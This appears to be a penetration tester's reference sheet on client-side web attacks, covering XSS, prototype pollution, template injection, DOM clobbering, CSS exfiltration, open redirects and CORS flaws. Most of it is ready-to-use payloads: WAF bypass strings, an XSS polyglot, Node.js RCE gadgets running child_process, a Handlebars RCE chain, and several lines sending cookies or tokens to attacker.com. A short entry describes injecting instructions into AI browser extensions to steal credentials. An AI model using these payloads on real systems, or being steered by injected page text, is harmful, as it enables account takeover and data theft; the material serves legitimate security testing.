# Client-Side Attacks Reference

## XSS (Cross-Site Scripting)

### Source Audit Targets
- Unescaped output in templates (raw/unfiltered rendering)
- DOM-based XSS via `innerHTML`, `document.write`, `eval()`, URL fragment, `location.*`, `document.referrer`, `window.name`, `postMessage`
- Stored XSS in names, titles, descriptions, comments, filenames, EXIF data, SVG uploads, imported data
- Reflected XSS in search, error messages, redirect parameters, 404 pages, JSON responses with wrong Content-Type
- CSP bypass vectors: `unsafe-inline`, `unsafe-eval`, `data:` URI, JSONP endpoints on whitelisted domains, `base-uri` missing (base tag injection), Angular/Vue template injection within CSP, CDN-hosted libraries with known gadgets, `object-src` to Flash/PDF, `script-src` with wildcard subdomains
- Mutation XSS (mXSS): browser HTML parser mutations turning safe markup into executable code (DOMPurify bypasses, namespace confusion)
- XSS in PDF generators (wkhtmltopdf, Puppeteer — `<script>`, `<iframe>`, SSRF+XSS), email templates (HTML injection), markdown renderers (link/image injection, HTML passthrough)
- Blind XSS: payload fires later in admin panel, logging dashboard, support ticket system, error monitoring tool; also via HTTP headers (Referer, User-Agent, X-Forwarded-For) and contact/feedback forms logged server-side
- mXSS via `<noscript>`: `<noscript><p title="</noscript><img src=x onerror=alert(1)>">` — parser re-enters HTML mode inside noscript when scripting disabled, turning safe attribute into executable markup
- XSS in hidden input via accesskey: `<input type="hidden" accesskey="X" onclick="alert(1)">` — requires Alt+Shift+X (Firefox) or Alt+X (Chrome) by victim, useful when CSP blocks other vectors
- `javascript:` URI in bot/automation flows: `javascript:fetch('//attacker.com/?c='+document.cookie)` — when Playwright, Selenium, or Puppeteer navigates to user-supplied URLs without scheme validation
- `window.name` as persistent XSS source: `window.name` persists across cross-origin navigations; if target page uses `innerHTML = name` (without `var name` declaration), attacker pre-sets it on a controlled page before redirecting victim
- `fetchLater` API: new browser API for deferred beacon-style requests; CSRF possible if endpoints accept it without CSRF tokens, since request fires after page unloads bypassing standard CSRF defenses
- XSS via SVG upload: `<svg onload="alert(1)">`, `<svg><script>alert(1)</script></svg>`
- XSS via content-type sniffing: missing `X-Content-Type-Options: nosniff` allows browser to interpret response as HTML
- XSS via service workers: registering a malicious service worker from XSS for persistence
- AngularJS sandbox escape (versions < 1.6): `{{constructor.constructor('alert(1)')()}}`
- Vue.js client-side template injection: `v-html` with user data, `{{constructor.constructor('alert(1)')()}}`
- React `dangerouslySetInnerHTML`, `href="javascript:..."` in user-controlled links
- XSS polyglots: payloads that work across multiple contexts (HTML, JS string, URL, attribute)
- DOM clobbering: using HTML elements (`<form id="x">`, `<img name="y">`) to overwrite DOM properties and escalate to XSS
- CSS injection (exfiltration via `background: url()` with attribute selectors, `@import`, `@font-face` with unicode-range)
- XSS in WebSocket message handlers
- XSS via `postMessage` without origin validation
- XSS in XML/SVG/MathML namespaces (namespace confusion bypasses sanitizers)
- JSON injection in `<script>` tags: breaking out of JSON assignment via `</script>`, `<!--`, line terminators (U+2028, U+2029)
- Header injection to XSS: CRLF injecting `Content-Type: text/html` or injecting body content

### Novel XSS Vectors (2024-2026)

**CSS-triggered execution (no user interaction):**
- `oncontentvisibilityautostatechange` — fires on elements with `content-visibility:auto`, no click needed
- `onanimationstart/end/cancel/iteration` — triggered by CSS `@keyframes`, cross-browser
- `ontransitionstart/end/run/cancel` — CSS transitions fire these on `:target` or class changes
- `onscrollsnapchange` / `onscrollsnapchanging` — fires at end of scroll on snap containers

**Popover & Dialog API abuse:**
- `onbeforetoggle` — fires before `popover` element toggles; just needs `<button popovertarget=x>`
- `oncommand` — fires when command sent via `commandfor`/`command` attributes (new HTML spec)
- `onclose` — dialog close event via `<form method=dialog>` inside `<dialog open>`

**Shadow DOM / Declarative Shadow Root:**
- `onslotchange` — fires when slot content changes inside `<template shadowrootmode=open>`, bypasses many sanitizers

**CSP ironic bypass:**
- `onsecuritypolicyviolation` — the CSP violation handler itself can execute JS
- `onunhandledrejection` — fires on unhandled Promise rejections

**Key insight:** Most events work on undefined/custom tags like `<xss>`, making tag-based WAF allowlists ineffective.

<!-- CSP bypass techniques moved to browser-attacks.md -->

### WAF-Specific XSS Bypasses

| WAF | Bypass Payload |
|-----|---------------|
| **Akamai Kona** | `\');confirm(1);//` |
| **ModSecurity** | `<img src=x onerror=prompt(document.domain) onerror=prompt(document.domain)>` |
| **Wordfence** | `<meter onmouseover="alert(1)"`, `><marquee loop=1 width=0 onfinish=alert(1)>` |
| **Incapsula** | `<iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';>`, `<img/src=q onerror='new Function\`al\\ert\\`1\\`\`'>` |

### Fontleak (CSS Font Exfiltration Without JS)

CSS `@font-face` with `unicode-range` per character + unique font URL per codepoint. Browser only fetches font if matching character exists in target element — exfiltrates text content character-by-character without JavaScript execution.

```css
@font-face { font-family: leak; src: url(https://attacker.com/?c=a); unicode-range: U+0061; }
@font-face { font-family: leak; src: url(https://attacker.com/?c=b); unicode-range: U+0062; }
/* ... one per character */
.target { font-family: leak; }
```

Advantages over attribute selector exfiltration: leaks **text node content**, not just attribute values. Combinable with `content-visibility: auto` for triggering without viewport scroll.

### XSS Polyglot (Universal Payload)
`jaVasCript:/*-/*\`/*\\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e`

### Markdown XSS Vectors
- `[a](javascript:confirm(1))`, `[a](javascript://www.google.com%0Aprompt(1))`
- `[a](javascript://%0d%0aconfirm(1);com)`, `[a](javascript:window.onerror=confirm;throw%201)`
- RubyDoc: `XSS[JavaScript:alert(1)]`
- Textile: `"Test link":javascript:alert(1)`
- reStructuredText: `` `Test link`__ `` with `javascript:alert(document.domain)`

---

## CSP Bypass Vectors (Quick Reference)

CSP bypass details moved to `browser-attacks.md`. Key vectors to test:
- `unsafe-inline`, `unsafe-eval`, `data:` URI, JSONP endpoints on whitelisted domains
- `base-uri` missing → base tag injection redirects script resolution
- Angular/Vue template injection within CSP
- CDN-hosted libraries with known gadgets (Prototype pollution, DOM clobbering)
- `script-src` with wildcard subdomains
- CSP violation events as execution gadgets

---

## Prototype Pollution (JavaScript)

### Server-Side (Node.js)
- Polluting `Object.prototype` via deep merge, recursive assign, `lodash.merge`/`lodash.set`/`lodash.defaultsDeep` (CVE-2018-16487), `jQuery.extend(true,...)`, `hoek.merge`, `destr`, `qs` library nested objects

### Client-Side
- URL parameter parsing (`?__proto__[isAdmin]=true`), JSON input with `__proto__`, `constructor.prototype`, or `constructor` keys

### Payloads
- `{"__proto__":{"isAdmin":true}}`
- `{"constructor":{"prototype":{"polluted":true}}}`
- `{"__proto__":{"shell":"/bin/bash","NODE_OPTIONS":"--require=/proc/self/environ"}}`

### Gadgets for RCE (Node.js)
- Pollute `shell`, `NODE_OPTIONS`, `env` properties used by `child_process.spawn/exec/fork`
- Pollute `mainModule` or `require` paths

### Gadgets for XSS (client)
- Pollute `innerHTML`, `src`, `href`, `srcdoc`, `data-*` attributes that frameworks read from prototype chain
- Pollute `transport_url` in Google Analytics
- Pollute `sourceURL` for eval-based gadgets

### Detection
- `({}).polluted` check, `Object.prototype.hasOwnProperty('polluted')`, Burp Suite DOM Invader

### Frameworks
- Express handlebars, EJS, Pug all have known prototype pollution to RCE gadgets

### Mitigation Bypass
- Even `Object.create(null)` can be bypassed if the pollution target is a different object in the chain

### Server-Side RCE Gadgets (Expanded)

**child_process gadgets:**

| Gadget | Polluted Properties | Impact |
|--------|-------------------|--------|
| **ENV + /proc/self/environ** | `NODE_OPTIONS`, `env` | `NODE_OPTIONS: "--require /proc/self/environ"` + env with JS code |
| **argv0 + /proc/self/cmdline** | `NODE_OPTIONS`, `argv0` | `NODE_OPTIONS: "--require /proc/self/cmdline"` + argv0 with JS |
| **data-URI import (Node >= 19)** | `NODE_OPTIONS` | `NODE_OPTIONS: "--import data:text/javascript;base64,..."` — no filesystem needed |
| **execArgv injection** | `execPath`, `execArgv`, `argv0` | `execPath: "/bin/sh"`, `execArgv: ["-c", "cmd"]` (fork only) |
| **stdin input injection** | `input` | `input: "commands\n"` (execSync/spawnSync) |
| **shell override** | `shell`, `argv0` | `shell: "/path/to/binary"` (exec/spawn) |

**Express.js / Middleware gadgets:**

| Gadget | Polluted Property | Impact |
|--------|------------------|--------|
| XSS via body overwrite | `_body`, `body` | Stored XSS (HTML served instead of JSON) |
| UTF-7 charset injection | `content-type` | Encoding bypass |
| Status code manipulation | `status` | Arbitrary HTTP status |
| CORS header injection | `exposedHeaders` | Header injection |
| Dot notation enabling | `allowDots` | Nested object creation from query strings |
| Parameter limits | `parameterLimit` | DoS or bypass |

**Blind detection payloads (non-destructive):**
- `"__proto__": {"json spaces": 10}` — detectable via JSON response formatting
- `"__proto__": {"exposedHeaders": ["x-"]}` — CORS header appears
- `"__proto__": {"status": 510}` — obscure status code returned
- DNS exfil: `"NODE_OPTIONS": "--inspect=id.oastify.com"` — OOB detection

### Client-Side Prototype Pollution Gadgets (50+)

| Library | Gadget | Impact |
|---------|--------|--------|
| **Vue.js** | `v-if`, `v-bind:class`, `template`, `attrs/is` | XSS via directive injection |
| **Knockout.js** | Array prototype pollution | XSS |
| **DOMPurify <= 2.0.12** | `ALLOWED_ATTR`, `documentMode` | Sanitizer bypass |
| **sanitize-html** | `*` wildcard, `innerText` | Sanitizer bypass |
| **js-xss** | `whiteList` pollution | Sanitizer bypass |
| **Google Closure** | `CLOSURE_BASE_PATH`, `trustedTypes/emptyHTML` | XSS |
| **i18next** | `nsSeparator`, `lng`, `key` | XSS |
| **Popper.js** | `arrow[ontransitionend]` | XSS via CSS transition event |
| **Pendo Agent** | `dataHost` | Remote script injection |
| **hCaptcha** | `assethost` | JavaScript protocol injection |
| **Google Tag Manager** | `vtp_enableRecaptcha/srcdoc`, `q` array | XSS |
| **Demandbase Tag** | `Config[SiteOptimization]` | Remote endpoint redirect |

### Kibana RCE (CVE-2019-7609)
Timelion label prototype → NODE_OPTIONS env var: `.es(*).props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ'...)`

### EJS Template Gadget → RCE
`{"__proto__": {"escapeFunction": "JSON.stringify; require('child_process').exec('id')"}}` — template injection to RCE

---

## Client-Side Template Injection (CSTI)

Client-side JS frameworks that evaluate expressions in user-controlled content:

| Framework | Payload | Notes |
|-----------|---------|-------|
| AngularJS 1.x | `{{constructor.constructor('alert(1)')()}}` | Sandbox removed in 1.6+ |
| AngularJS 1.x (sandbox escape) | `{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)')}}` | Pre-1.6 |
| Vue.js 2 | `{{_c.constructor('alert(1)')()}}` | Via `v-html` or template compilation |
| Vue.js 3 | `{{$parent.$parent...$el.ownerDocument.defaultView.alert(1)}}` | Parent chain traversal |
| Handlebars | `{{#with "s" as \|string\|}}{{#with "e"}}{{#with split as \|conslist\|}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as \|codelist\|}}{{this.push "return require('child_process').exec('id')"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}` | Server-side Handlebars RCE |
| Svelte | `{@html userInput}` | Explicit unsafe render directive |
| Mithril.js | `m.trust(userInput)` | Marks HTML as trusted |

Key distinction from XSS: CSTI exploits the template engine's expression evaluator, not HTML parsing. Payloads contain no `<script>` tags or event handlers — they use the framework's own interpolation syntax.

Detection: look for double-curly-brace `{{}}` reflection in page source within Angular/Vue apps, or template compilation of user-controlled strings.

---

### postMessage Exploitation

Vulnerable receiver patterns (missing origin validation):
```javascript
window.addEventListener('message', function(e) {
  eval(e.data)                    // RCE
  element.innerHTML = e.data      // DOM XSS
  location.href = e.data          // open redirect
  fetch(e.data.url)               // SSRF
});
```

Origin validation bypasses:
- `null` origin: triggered by `data:` URIs, sandboxed iframes (`<iframe sandbox="allow-scripts">`)
- Regex bypass: `if (e.origin.match(/victim\.com/))` matches `victim.com.attacker.com`
- Endswith bypass: `e.origin.endsWith('victim.com')` matches `evilxvictim.com`
- Bidirectional: `e.source.postMessage()` for two-way exploitation

Tools: Posta (Chrome extension), DOM Invader (Burp), manual DevTools: `getEventListeners(window)`.

### postMessage Deep Exploitation Patterns

**Inverted origin check (deny-list instead of allow-list):**
```javascript
// VULNERABLE: blocks known attacker but accepts attacker.com.evil.com
if (e.origin !== 'https://attacker.com') { processMessage(e.data); }
// CORRECT: allow-list exact match
if (e.origin === 'https://trusted.com') { processMessage(e.data); }
```

**Regex domain bypass patterns:**
- `e.origin.match(/trusted\.com/)` → matches `trusted.com.evil.com` (no anchoring)
- `/^https:\/\/.*trusted\.com$/.test(e.origin)` → matches `https://evil-trusted.com`
- `/trusted\.com$/.test(e.origin)` → matches `https://nottrusted.com`
- Fix: exact string match `e.origin === 'https://trusted.com'` — never regex for origin validation

**Origin stored then used as script.src:**
```javascript
window.addEventListener('message', function(e) {
  var config = { origin: e.origin, data: e.data };
  // Later in code — attacker-controlled origin becomes script source
  var s = document.createElement('script');
  s.src = config.origin + '/api/widget.js';
  document.body.appendChild(s);
});
```
Origin validated at receipt but stored and reused later without re-validation — deferred trust.

**Type confusion via Array.toString():**
```javascript
// Handler expects string, receives array
postMessage(['<img src=x onerror=alert(1)>'], '*');
// Array.toString() joins with comma: '<img src=x onerror=alert(1)>'
// If handler does: element.innerHTML = e.data → XSS
```

**MessageChannel port reuse:**
- Sender creates `MessageChannel`, sends `port2` to victim window via `postMessage`
- Victim stores port and sends sensitive data back (tokens, user data)
- If port ownership isn't validated, attacker intercepts responses meant for trusted sender
- Attack: attacker sends own `MessageChannel` port before trusted sender → victim responds to attacker

**Math.random() PRNG reconstruction via Z3:**
- Application generates CSRF tokens or session identifiers using `Math.random()`
- `postMessage` leaks random values to cross-origin observers
- Mersenne Twister (V8's PRNG) state recoverable from ~625 observed outputs
- Tool: Z3 SMT solver constrains MT19937 state from observed values → predict future tokens
- Impact: CSRF token prediction, session ID prediction

**window.name persistence across navigations:**
- `window.name` survives cross-origin navigations (unlike most DOM properties)
- Attacker sets `window.name = '<img src=x onerror=alert(1)>'` on controlled page
- Redirects victim to target page that reads `window.name` without sanitization
- Persists until tab is closed — survives page reloads and same-tab navigations

---

## CORS Misconfiguration

- `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true` (browser blocks this, but misconfigured reflection doesn't)
- Origin reflection: server reflects `Origin` header directly in `Access-Control-Allow-Origin` — attacker origin gets access
- Null origin allowed: `Access-Control-Allow-Origin: null` — achievable via sandboxed iframe, data URI, `file://`
- Subdomain wildcard: `*.example.com` trusted — XSS on any subdomain escalates to cross-origin data access
- Pre-flight bypass: simple requests (GET/POST with certain content types) skip OPTIONS check
- Regex bypass in origin validation: `evil-example.com` matches regex for `example.com`, `example.com.evil.com`

---

## Open Redirect

- Redirect parameters: `?url=`, `?next=`, `?redirect=`, `?return=`, `?returnTo=`, `?goto=`, `?dest=`, `?continue=`, `?target=`
- Protocol-relative redirect: `//attacker.com` — browser interprets as `https://attacker.com`
- Bypass domain validation: `https://legit.com@attacker.com`, `https://attacker.com#legit.com`, `https://legit.com.attacker.com`, `https://attacker.com/legit.com`, `https://legit.com%40attacker.com`
- Backslash trick: `https://legit.com\@attacker.com` — some parsers treat `\` as path separator
- URL encoding bypass: `%2f%2fattacker.com`, `%09`, `%0d`, `%0a` breaking URL parsing
- Data URI redirect: `data:text/html,<script>...` (some frameworks follow data URIs)
- JavaScript URI: `javascript:alert(1)` in redirect destination (if used in `window.location`)
- Double/triple URL encoding
- Chaining: open redirect → OAuth token theft, open redirect → SSRF filter bypass, open redirect → phishing

---

## Cookie Tossing → OAuth Hijacking

Exploits the fact that cookies predate the Same-Origin Policy — a subdomain (`evil.sub.example.com`) can set cookies scoped to the parent domain (`example.com`).

**Attack chain:**
1. Attacker has XSS on any subdomain (even self-XSS on a low-value subdomain)
2. Inject cookies with `Path=/oauth/callback` scoped to parent domain
3. Overwrite victim's OAuth `state` parameter cookie
4. Victim's OAuth flow uses attacker-controlled `state` → attacker links their IdP account to victim's session → ATO

**Key innovation:** Weaponizes self-XSS (normally zero-impact) and low-value subdomain XSS into full OAuth account takeover. Path-scoped cookie injection targeting only OAuth endpoints is the critical technique.

Source: Elliot Ward / Snyk Labs, 2024.

## Cookie Crumbles — CSRF Token Fixation & Session Integrity (2023)

Marco Squarcina et al.'s USENIX Security 2023 paper systematically evaluates web session cookie implementations, revealing widespread CSRF token fixation vulnerabilities.

**CSRF Token Fixation:**
- Application validates CSRF token on POST but doesn't rotate it per-session
- Attacker obtains a valid CSRF token (from public page or predictable generation)
- Plant token in victim's session via cookie injection or session fixation
- Forge request with known valid token → CSRF bypasses token-based protection

**Affected frameworks (documented):**
- **Symfony:** CSRF token valid for entire session lifetime — session fixation plants attacker-known token
- **Django:** CSRF token rotated on login but not on session ID rotation
- **Rails:** `authenticity_token` per-form but reusable within session window

**Detection:**
- Obtain CSRF token from public endpoint, test if it remains valid after session cycling
- Check if token changes between login/logout cycles on the same browser
- Test token validity across different users or sessions

Source: Squarcina, Adão, Veronese & Maffei, USENIX Security 2023 / PortSwigger Top 10 Web Hacking Techniques of 2023 #9.

## HashJack (AI Browser Extension Injection)

AI-powered browser extension manipulation — inject malicious instructions into DOM content that AI browser extensions (Copilot, ChatGPT extensions, etc.) process. Extension executes attacker's commands in browser context with extension permissions, enabling auth flow interception, credential theft, and session hijacking.

## PDF.js Arbitrary Code Execution (CVE-2024-4367)

Font rendering vulnerability in Mozilla's PDF.js library allows arbitrary JavaScript execution when rendering malicious PDFs. Affects:
- All Firefox users viewing PDFs (PDF.js is built-in)
- Any web application embedding PDF.js for document viewing
- Electron apps using PDF.js

**Impact:** Open a crafted PDF → XSS in the PDF viewer's origin context. If the viewer runs on a sensitive domain, attacker gets full same-origin access.

## Magecart via GTM CSS Content Carrier (2025)

Evolved Magecart skimming technique using Google Tag Manager as a living-off-the-land delivery mechanism:

1. Compromise GTM container → load second GTM container
2. Second container loads a fake CSS file
3. JavaScript payload hidden inside CSS `::before { content: "..." }` property
4. Third GTM container extracts and `eval()`s the hidden JS from the `<link>` element's computed style
5. Payload establishes WebSocket to C2 for real-time card data exfiltration

**Why it evades detection:**
- GTM domains commonly in CSP allowlists
- CSS file passes static analysis (no `<script>` tags)
- Triple-container indirection defeats Magecart detection rules
- WebSocket exfil bypasses network-level content inspection

Source: Recorded Future H1-2025 Malware Trends.

## Supply-Chain XSS via Shared Analytics Scripts

Third-party analytics scripts (Facebook Pixel `fbevents.js`, Google Analytics, Segment, Mixpanel) loaded on thousands of sites create a shared execution context exploitable for mass XSS.

**Server-side code generation pattern:**
```javascript
// Server generates JS code embedding user-controlled values via string concatenation
// Backend: res.send(`fbq('track', 'Purchase', {value: '${req.query.amount}'});`);
// Attacker: ?amount=0'});alert(document.cookie);//
// Rendered: fbq('track', 'Purchase', {value: '0'});alert(document.cookie);//'});
```

**Attack vectors:**
- **User-controlled values in server-rendered analytics calls:** form inputs, URL parameters, or stored data string-concatenated into `<script>` blocks that configure analytics — no client-side sanitization because the code is generated server-side
- **Shared script compromise:** a single compromised analytics script (CDN-hosted, cached at edge) executes in the origin context of every site loading it — CSP `script-src` typically allowlists these domains
- **Tag manager injection:** GTM/Adobe Launch containers loading user-configurable tags — inject arbitrary JS via tag configuration without touching source code
- **Data layer pollution:** push attacker-controlled values into `window.dataLayer` → analytics scripts read and eval/interpolate them

**Detection:** grep for server-side string concatenation of user input into `<script>` blocks, especially analytics configuration. Look for `fbq(`, `ga(`, `gtag(`, `analytics.track(` with interpolated variables.

---

<!-- Reverse Tabnabbing moved to browser-attacks.md -->

## DOM Clobbering

### Core Mechanism
HTML elements with `id` or `name` attributes automatically create global variables on `window` and named properties on `document`. Elements supporting `name` clobbering: `embed`, `form`, `iframe`, `image`, `img`, `object`.

### Gadget Patterns

**Named access override:**
```html
<a id=someObject><a id=someObject name=url href=//evil.com/payload.js>
```
Multiple anchors with same `id` create a DOM collection. `name` becomes a property: `someObject.url` → attacker-controlled `href`.

**document property hijacking:**
```html
<img name=cookie /> <!-- document.cookie now returns HTMLImageElement -->
```

**Form hijacking:**
```html
<textarea form="id-other-form" name="info">attacker-data</textarea>
<button form="id-other-form" type="submit" formaction="/edit"></button>
```

### Nested Property Clobbering
- **Two-level (a.b):** `<a id="x"><a id="x" name="y" href="controlled">` → `x.y` returns href
- **Three-level (a.b.c):** `<form id="x" name="y"><input id="z" value="controlled"/>` → `x.y.z.value`
- **Deep nesting via iframes:** multiple nested iframes with HTML-encoded content for `a.b.c.d.e`

### Sanitizer Bypasses

**DOMPurify `cid:` protocol bypass:**
```html
<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
```
`cid:` protocol avoids URL-encoding of double quotes. At runtime, browser decodes entity, breaking out of attribute context.

**Form `attributes` property clobbering:**
```html
<form onclick=alert(1)><input id=attributes>Click me</form>
```
Sanitizers expect `.attributes` to be `NamedNodeMap`. Clobbering with `<input>` causes enumeration to fail silently — malicious attributes never removed.

**SVG context clobbering:** `<body>` within `<svg>` and `<html>` within `<svg><foreignobject>` bypass sanitizers that only handle HTML namespaces.

### toString/valueOf Exploitation
- Anchor elements return their `href` when coerced to string — attackers control string value
- Form elements return `[object HTMLFormElement]` — useful for type-check bypasses

### DOM Clobbering CVE Collection (2024-2025)

Widespread DOM clobbering vulnerabilities discovered across major frontend tooling — most exploitable via `document.currentScript` or `document.scripts` clobbering in HTML injection contexts (e.g., markdown renderers, CMS user content, email HTML).

| Library | CVE | Clobbered Property | Impact |
|---------|-----|-------------------|--------|
| **Vite** | CVE-2024-45812 | `document.currentScript` | XSS in dev server via clobbered script src |
| **Webpack** | CVE-2024-43788 | `document.currentScript.src` | XSS in dev server hot reload |
| **Astro** | CVE-2024-47885 | `document.scripts` | XSS in SSR pages with user-controlled HTML |
| **Rollup** | (reported) | `document.currentScript` | XSS in bundled output |
| **Prism.js** | (reported) | `document.currentScript`/`document.scripts` | XSS via syntax highlighter |
| **MathJax** | (reported) | `document.currentScript` | XSS in math rendering contexts |
| **FilePond** | (reported) | Named form elements | XSS via file upload widget |

**Common gadget pattern:** Libraries use `document.currentScript.src` to determine their base URL for loading additional resources. Clobbering with `<img name="currentScript" src="https://attacker.com/evil.js">` redirects resource loading to attacker server.

**`document.scripts` collection clobbering:** `<img name="scripts">` replaces `document.scripts` HTMLCollection with a single element, breaking iteration-based script detection and enabling injection.

---

## CSS Injection Exfiltration

### Attribute Selector Extraction
```css
input[value^="a"] { background: url(https://attacker.com/leak?char=a); }
```
Character-by-character leaking via prefix matching. Each matching selector triggers HTTP request.

**Hidden element bypass via sibling combinator:**
```css
input[type=hidden][value^="token"] ~ * { background: url(https://attacker.com/leak?v=token); }
```

### `:has()` Selector Abuse (Modern Browsers)
```css
form:has(input[name="csrf"][value^="abc"]) { background: url(https://attacker.com/?prefix=abc); }
```
Checks child element attributes from parent. Works on hidden inputs without knowing page structure.

### @import Recursive Chain
Server delays each `@import` response until previous character confirmed. Creates a blocking chain automating sequential extraction from single injection point.

### Font-Face Unicode-Range Method
```css
@font-face { font-family: probe; src: url(https://attacker.com/leak?char=A); unicode-range: U+0041; }
```
Browser only fetches font if target contains matching characters.

### Ligature-Based Text Node Extraction
1. Custom SVG fonts where specific character sequences (ligatures) have extreme widths
2. Matching sequence changes element width → horizontal scrollbar appears
3. Scrollbar triggers `body::-webkit-scrollbar` styling → background-image request
4. Extracts **text content** (not just attributes) — works on CSRF tokens rendered as text

### CSP Bypass Considerations
- CSS injection not blocked by `script-src` CSP — operates within style contexts
- `style-src 'unsafe-inline'` (extremely common) enables inline injection
- `:has()` technique works entirely within existing page styles
- No JavaScript execution needed for any CSS exfiltration technique

### PHP Quirks Mode CSS Exfiltration

When PHP renders HTML without a DOCTYPE (quirks mode), CSS parsing rules differ — `background:url()` in `::before`/`::after` content properties becomes exploitable in contexts where `@import` is blocked. Quirks mode also affects how browsers handle malformed CSS, enabling exfiltration vectors that fail in standards mode.

### cross-fade() Recursive Exfiltration (Proton Mail Research)

Advanced CSS exfiltration technique using nested `cross-fade()` CSS function to assign multiple background URLs to a single element — each URL triggers a separate fetch, enabling parallel character extraction.

**Mechanism:**
1. Use CSS attribute selectors to detect substrings in target value (e.g., blob URL, CSRF token)
2. Each matching selector sets a CSS variable to a unique callback URL
3. A final selector nests all variables inside `cross-fade()` calls: `cross-fade(url(var(--a)), cross-fade(url(var(--b)), ...))`
4. Browser must fetch ALL URLs in the nesting tree to render the final image
5. Unset variables default to `none` (no fetch) — only matching selectors trigger requests

**Advantages over sequential methods:**
- Multiple characters leaked per page load (vs one-at-a-time with `@import` chains)
- Works with `content-visibility: auto` for triggering without scroll
- Used to leak blob URLs in Proton Mail (SonarSource research, 2024)
- No JavaScript execution needed — pure CSS

---

<!-- DoubleClickjacking moved to browser-attacks.md -->

### Client-Side Path Traversal (CSPT)

Also called "On-site Request Forgery" — exploits client-side `fetch()`/`XMLHttpRequest` calls where `../` can be injected into the URL path to redirect the request to a different endpoint.

**Mechanism:**
1. Frontend code constructs API URL using user-controlled value: `fetch('/api/users/' + userId + '/profile')`
2. Attacker injects `../` sequences: `userId = '../../admin/delete-user'`
3. After browser URL normalization, request goes to `/api/admin/delete-user` instead
4. Browser automatically includes cookies and auth headers — acts as authenticated CSRF

**CSPT → CSRF chain (Doyensec research):**
- CSPT source: user-controlled value reflected in a `fetch()` URL path
- CSPT sink: a different API endpoint (state-changing) reachable via path traversal
- Since requests originate from the same frontend, all cookies/auth tokens are automatically attached
- Bypasses traditional CSRF protections (SameSite cookies, origin checks) because the request genuinely originates from the legitimate frontend

**Detection:**
- Burp extension: `doyensec/CSPTBurpExtension` (passive scanner)
- Canary token feature: inject unique token in source, check if it appears in sink request path
- Manual: look for query parameters reflected inside paths of other requests in proxy history
- WAF bypass via encoding levels (Matan Berson, 2024)

**Tools:** Doyensec CSPT Burp Extension, Eval Villain (browser extension for DOM taint tracking)

**Real-world CVEs:** Mattermost, Rocket.Chat, Jupyter (CVE-2023-39968 + CVE-2024-22421 chained with Chromium bug)

**Related: Google Search XSS via URL Path Normalization (Masato Kinugawa, 2019):**
Masato Kinugawa XSS'd Google Search by exploiting URL path normalization differentials — demonstrating how browser URL handling can create XSS vectors even in the most-tested input on the planet. The technique involved reading browser source code and fuzzing URL parser behavior to find a DOM clobbering path. This methodology (spec reading + fuzzing) applies directly to client-side path traversal discovery.

Source: Masato Kinugawa & LiveOverflow, PortSwigger Top 10 Web Hacking Techniques of 2019 #5.

<!-- XS-Leaks moved to browser-attacks.md -->

<!-- SVG Filter Clickjacking moved to browser-attacks.md -->

## Web Timing Attacks (PortSwigger Research, 2024-2025)

Server-side timing analysis to detect vulnerabilities without relying on response content.

### Practical Timing Signals

| Signal | What It Reveals | Example |
|--------|----------------|---------|
| **Cache key detection** | Which params are in cache key | Keyed param: 310ms (DB hit) vs unkeyed: 22ms (cache hit) |
| **Header processing** | Which headers trigger server logic | `authorization: x` → 50ms vs `foo: x` → 30ms |
| **SSRF confirmation** | DNS resolution / connection | First request: 25ms; second (DNS cached): 15ms |
| **SQLi confirmation** | Query execution time | `' AND SLEEP(2)--` adds 2000ms |
| **Hidden param discovery** | Server processes undocumented params | `?debug=1` adds 200ms processing time |

### Techniques
- **Param Miner timing mode:** detect unkeyed parameters via response time differential
- **DNS caching as SSRF oracle:** first request triggers DNS lookup (slow), second uses cache (fast) — proves server resolved the hostname
- **Connection state timing:** server-side connection pool reuse vs new connection measurable via response time
- **Single-packet timing:** HTTP/2 multiplexing to eliminate network jitter in timing measurements
